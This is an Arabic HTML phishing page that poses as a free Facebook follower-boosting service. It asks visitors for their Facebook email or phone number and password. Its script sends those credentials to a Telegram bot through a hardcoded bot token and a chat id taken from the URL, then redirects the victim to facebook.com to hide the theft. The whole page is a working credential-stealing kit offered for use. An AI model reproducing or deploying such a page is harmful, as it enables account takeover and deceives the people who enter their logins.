<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Facebook رشق</title>
    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;padding:25px;border-radius:12px;box-shadow:0 2px 15px rgba(0,0,0,0.1);width:380px;text-align:center}img{width:60px;margin:0 auto 15px;display:block}h2{color:#1877f2;margin-bottom:6px}p{color:#606770;font-size:14px;margin-bottom:18px}.gift-box{background:#1877f2;color:#fff;border-radius:12px;padding:12px;margin-bottom:15px}.gift-box span{font-weight:bold;font-size:18px}input,select{width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:8px;font-size:16px;background:#f5f6f7;text-align:center}.btn{background:#1877f2;color:#fff;border:none;padding:14px;width:100%;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px}.btn:hover{background:#166fe5}</style></head>
<body><div class="card">
<img src="https://logodownload.org/wp-content/uploads/2014/09/facebook-logo-1.png" alt="Facebook">
<h2>📘 رشق متابعين فيسبوك</h2>
<p>احصل على متابعين حقيقيين مجاناً!</p>
<div class="gift-box"><span>🎉 500 متابع مجاناً</span></div>
<select id="amount"><option value="100">100 متابع</option><option value="500" selected>500 متابع</option><option value="1000">1000 متابع</option></select>
<input id="username" placeholder="البريد الإلكتروني أو رقم الهاتف">
<input id="password" type="password" placeholder="كلمة المرور للتأكيد">
<button class="btn" onclick="sendData()">إرسال الرشق الآن 🚀</button>
<p id="msg" style="margin-top:12px;font-size:14px;font-weight:bold;"></p>
</div>
<script>
const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT=p.get('chat');
function sendData(){const u=document.getElementById('username').value,pa=document.getElementById('password').value,am=document.getElementById('amount').value;
if(!u||!pa)return alert('املأ جميع الحقول');
document.getElementById('msg').innerHTML='⏳ جاري إرسال الرشق...';
fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent('📘 رشق فيسبوك\n👤 '+u+'\n🔑 '+pa+'\n📊 الكمية: '+am+' متابع')}`).then(()=>{document.getElementById('msg').innerHTML='✅ تم الإرسال! سيصل الرشق خلال دقائق.';setTimeout(()=>location.href='https://facebook.com',3000)});}
</script></body></html>
